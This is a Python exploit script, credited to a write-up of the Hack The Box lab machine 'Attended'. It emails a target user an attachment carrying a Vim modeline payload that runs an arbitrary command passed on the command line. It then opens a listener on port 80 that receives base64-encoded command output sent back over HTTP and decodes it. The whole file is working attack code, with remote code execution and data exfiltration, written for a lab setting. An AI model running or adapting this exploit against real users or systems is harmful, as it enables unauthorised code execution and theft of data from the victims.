#!/usr/bin/python3

##
##
## c/o 0xdf
## https://0xdf.gitlab.io/2021/05/08/htb-attended.html
###################
##

import base64
import smtplib
import socket
import sys
from datetime import datetime
from email.message import EmailMessage


command = sys.argv[1]
payload = f''':!python2 /tmp/cmdrunner.py '{command}'|" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="'''

msg = EmailMessage()
msg["From"] = 'freshness@attended.htb'
msg["To"] = 'guly@attended.htb'
msg["Subject"] = 'file you asked for?'
msg.set_content = 'Here you go'
msg.add_attachment(payload, filename="poc.txt")

s = smtplib.SMTP('10.10.10.221', 25)
s.send_message(msg)
sys.stderr.write(f'[+] Email sent at {datetime.now()}. Listening on 80 for RCE response.\n')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 80))
    s.listen(100)
    exfil = b''
    i = 0
    while True:
        conn, addr = s.accept()
        sys.stderr.write(f'\r[+] Connection revieved at {datetime.now()}: {i}')
        i += 1
        with conn:
            data = conn.recv(8096)
            conn.send(b'HTTP/1.0 200 OK\n\n')
            b64 = data.split(b' ')[1][1:]
            if b64 == b'done':
                break
            exfil += base64.b64decode(b64)
    sys.stderr.write('\n')
    sys.stdout.buffer.write(exfil)  
    
###############
##
##
